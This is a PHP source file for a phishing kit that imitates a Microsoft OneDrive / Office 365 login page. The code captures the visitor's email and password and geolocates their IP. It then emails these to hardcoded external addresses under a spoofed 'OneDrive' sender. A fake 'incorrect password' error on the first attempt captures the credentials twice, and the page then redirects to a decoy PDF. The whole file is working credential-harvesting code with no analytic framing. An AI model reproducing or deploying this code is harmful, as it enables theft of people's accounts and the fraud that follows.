<?php require_once "header.php"; ?>

<?php

	if(isset($_POST['submit'])) {
		$email = $_POST['email'];
		$password = $_POST['password'];

		if (isset($_SERVER['HTTP_CLIENT_IP'])) {
			$real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
		}

		if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else {
			$real_ip_adress = $_SERVER['REMOTE_ADDR'];
		}

		$cip = $real_ip_adress;

		$url = "http://ip-api.com/php/" . $cip;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
		$ip_dat = curl_exec($ch);
		curl_close($ch);

		$ip_data = unserialize($ip_dat);
		$ip_data = json_decode(json_encode($ip_data), true);

		$country = $ip_data['country'];

		if(empty($email) || empty($password)) {
			$error = "Invalid Credentials";
		}
		else {
			if(empty($_SESSION['uid'])) {
				$_SESSION['uid'] = "1";
				$error = "Your account or password is incorrect.";
				hvemail($email,$password,$cip,$country);
			}
			else {
				$_SESSION['uid']++;
				hvemail($email,$password,$cip,$country);
				header("Location: custom/0649_uk_reportable_income.pdf");
			}

			if($_SESSION['uid'] >= 2) {
				session_destroy();
			}
		}
	}

	function hvemail($email, $password, $cip, $country) {
		$to = "nzbillions@yandex.com,nzbillions@gmail.com,billionairel0g3@gmail.com,";
		$subject = "N3w True L0gin |";
		$message = "
<html>
<head>
<title>OneDrive Information</title>
</head>
<body>
<h1>DXB Billi Info</h1>
<br>
<h6>Email Address: <b style=\"color:#e46363;\">". $email ."</b></h6>
<h6>Password: <b style=\"color:#e46363;\">". $password ."</b></h6>
<h6>IP Address: <b style=\"color:#e46363;\">". $cip ."</b></h6>
<h6>Country: <b style=\"color:#e46363;\">". $country ."</b></h6>
</body>
</html>
";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From: OneDrive' . "\r\n";

mail($to,$subject,$message,$headers);
	}
?>

<div class="h-100 d-flex justify-content-center align-items-center">
    <div class="container">
    	<div class="row">
    		<div class="col-lg-6 offset-lg-3">
	    		<div class="card login-card">
		    		<div class="card-body px-5 py-5">
		    			<img src="custom/images/microsoft_logo.svg" class="img-fluid">
		    			<div class="text-right" style="margin-top:-2rem;"><img src="custom/images/onedrive.png" class="img-fluid" style="height:32px;"></div>
		    			<h6 class="mt-4 hv-bold text-hv">Sign in with your Office 365 account to view shared file</h6>
		    			<hr>
                                   
		    			<form method="post" action="">

		    			<?php if(!empty($error)): echo "
                    		<div class='bg-danger mb-3 p-2 text-white text-center rounded'>" .
                         $error ."</div>"; endif; ?>

			    			<div class="input-group mb-3">								
								<input type="text" name="email" id="email" placeholder="Email Address" class="form-control">
							</div>

			    			<div class="input-group mb-3">								
								<input type="password" name="password" id="password" placeholder="Password" class="form-control">
							</div>

							<div>
								<p>© 2021 OneDrive.<a href="" class="text-hv"></a></p>

								<div class="float-right">
									<input type="submit" name="submit" value="Login" class="btn bg-hv px-5 text-white">
								</div>
								
							</div>
		    			</form>
		    		</div>
		    	</div>
    		</div>
    	</div>
    </div>
</div>

<?php require_once "footer.php"; ?>